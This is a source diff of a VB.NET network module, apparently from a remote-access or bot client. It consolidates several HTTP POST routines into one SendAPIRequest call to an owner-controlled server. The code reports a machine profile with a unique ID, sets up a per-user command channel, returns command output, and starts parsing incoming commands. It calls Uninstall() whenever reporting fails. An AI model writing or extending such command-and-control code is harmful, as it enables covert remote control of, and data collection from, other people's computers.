@@ -3,9 +3,43 @@ Imports System.Net
 Imports System.Text
 Imports System.Threading
 Namespace Network
+    Enum API_TYPES
+        PING
+        COMMAND
+        TELEMETRY
+        USER_REPORT
+    End Enum
     Module Telemetry
         Public refreshTelemetryThread As Thread = New Thread(New ThreadStart(AddressOf SendRefreshTelemetry))
         Public IsrefreshTelemetryThreadRunning As Boolean = False
+
+        Function SendAPIRequest(ByVal clase As API_TYPES, ByVal content As String) As Boolean
+            Try
+                'AddToLog("Network", "Sending API Request...", False)
+
+                Dim request As HttpWebRequest = CType(WebRequest.Create(HttpOwnerServer & "/api.php"), HttpWebRequest)
+                content = content.Replace("&", "{ampersand}")
+                content = content.Replace("?", "{questionmark}")
+                Dim postData As String = "content=" & content
+                request.ContentType = "application/x-www-form-urlencoded"
+                request.Method = "POST"
+                request.Headers("Ident") = UID
+                request.Headers("Clase") = clase.ToString
+
+                Dim dataStream As New StreamWriter(request.GetRequestStream())
+                dataStream.Write(postData)
+                dataStream.Close()
+                Dim response As WebResponse = request.GetResponse()
+                'AddToLog("Network", "Response for '" & CStr(clase.ToString) & "': " & CType(response, HttpWebResponse).StatusCode & " " & CType(response, HttpWebResponse).StatusDescription, False)
+                response.Close()
+
+                Return True
+            Catch ex As Exception
+                AddToLog("SendAPIRequest@Network", "Error: " & ex.Message, True)
+                Return False
+            End Try
+        End Function
+
         Sub ReportMeToServer()
             Try
                 Dim reportContent As String = "#New User Report " & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & " Version: " & My.Application.Info.Version.ToString & " (" & Application.ProductVersion & ")" &
@@ -22,49 +56,23 @@ Namespace Network
                 vbCrLf & "RAM=" & My.Computer.Info.TotalPhysicalMemory &
                 vbCrLf & "Screen=" & My.Computer.Screen.Bounds.ToString & " | (Working area: " & My.Computer.Screen.WorkingArea.ToString & ")" &
                 vbCrLf & vbCrLf & vbCrLf
-                Dim tlmReviewed As String = reportContent
-                If tlmReviewed.Contains("&") Then
-                    tlmReviewed = tlmReviewed.Replace("&", "(AndSymb)")
-                End If
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/userReport.php")
-                request.Method = "POST"
-                Dim postData As String = "ident=" & UID & "&log=" & tlmReviewed
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("ReportMeToServer@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-                'End If
-                response.Close()
+
+                SendAPIRequest(API_TYPES.USER_REPORT, reportContent)
+
             Catch ex As Exception
                 AddToLog("ReportMeToServer(CreateUser)@Network", "Error: " & ex.Message, True)
                 Uninstall()
             End Try
             Try
-                'Create CMD file on server
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
-                request.Method = "POST"
-                Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                Dim postData As String = "#Command Channel for Unique User. CMD Created (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                 vbCrLf & "Command1>" &
                 vbCrLf & "Command2>" &
                 vbCrLf & "Command3>" &
                 vbCrLf & "[Response]" &
                 vbCrLf
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("CreateCMDFile@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-                'End If
-                response.Close()
+
+                SendAPIRequest(API_TYPES.COMMAND, postData)
+
             Catch ex As Exception
                 AddToLog("ReportMeToServer(CreateCMD)@Network", "Error: " & ex.Message, True)
                 Uninstall()
@@ -73,21 +81,9 @@ Namespace Network
         Sub SendFirstTelemetry()
             Try
                 AddToLog("Network", "Sending first telemetry...", False)
-                Dim reportContent As String = tlmContent
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/telemetryPost.php")
-                request.Method = "POST"
-                Dim postData As String = "ident=" & UID & "&log=" & reportContent
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-                'End If
-                response.Close()
+
+                SendAPIRequest(API_TYPES.TELEMETRY, tlmContent)
+
                 tlmContent = Nothing
             Catch ex As Exception
                 AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
@@ -96,20 +92,9 @@ Namespace Network
         Sub SendTelemetry()
             Try
                 AddToLog("Network", "Sending telemetry...", False)
-                Dim reportContent As String = tlmContent
-                reportContent = reportContent.Replace("&", "(AndSymb)")
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Telemetry/tlmRefresh.php")
-                request.Method = "POST"
-                Dim postData As String = "ident=" & UID & "&log=" & reportContent
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("SendTelemetry@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                response.Close()
+
+                SendAPIRequest(API_TYPES.TELEMETRY, tlmContent)
+
                 tlmContent = Nothing
             Catch ex As Exception
                 AddToLog("SendTelemetry@Network", "Error: " & ex.Message, True)
@@ -218,25 +203,15 @@ Namespace Network
 
         Function SendCommandResponse(Optional ByVal CMDResponse As String = Nothing) As String
             Try
-                Dim request As WebRequest = WebRequest.Create(HttpOwnerServer & "/Users/Commands/cliResponse.php")
-                request.Method = "POST"
-                Dim postData As String = "ident=" & UID & "&text=" & "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
+                Dim postData As String = "#Command Channel for Unique User. Responded (" & DateTime.Now.ToString("hh:mm:ss tt dd/MM/yyyy") & ")" &
                 vbCrLf & "Command1>" &
                 vbCrLf & "Command2>" &
                 vbCrLf & "Command3>" & PersistentCommand &
                 vbCrLf & "[Response]" &
                 vbCrLf & CMDResponse
-                Dim byteArray As Byte() = Encoding.UTF8.GetBytes(postData)
-                request.ContentType = "application/x-www-form-urlencoded"
-                request.ContentLength = byteArray.Length
-                Dim dataStream As Stream = request.GetRequestStream()
-                dataStream.Write(byteArray, 0, byteArray.Length)
-                dataStream.Close()
-                Dim response As WebResponse = request.GetResponse()
-                AddToLog("SendCommandResponse@Network", "Response: " & CType(response, HttpWebResponse).StatusDescription, False)
-                'If CType(response, HttpWebResponse).StatusDescription = "OK" Then
-                'End If
-                response.Close()
+
+                SendAPIRequest(API_TYPES.COMMAND, postData)
+
                 Return CMDResponse
             Catch ex As Exception
                 Return AddToLog("SendCommandResponse@Network", "Error: " & ex.Message, True)
@@ -350,6 +325,12 @@ Namespace Network
         End Function
         Function ProccessCommand(ByVal command As String) As String
             Try
+                Dim strI As Integer = -1
+                Dim strContent As String = Nothing
+                If command.Contains("'") Then
+                    strI = command.IndexOf("'")
+                    strContent = command.Substring(strI + 1, command.IndexOf("'", strI + 1) - strI - 1)
+                End If
                 Dim CommandCMD As String = command
                 If CommandCMD.Contains("=") Then
                     CommandCMD = CommandCMD.Remove(0, CommandCMD.LastIndexOf("=") + 1)
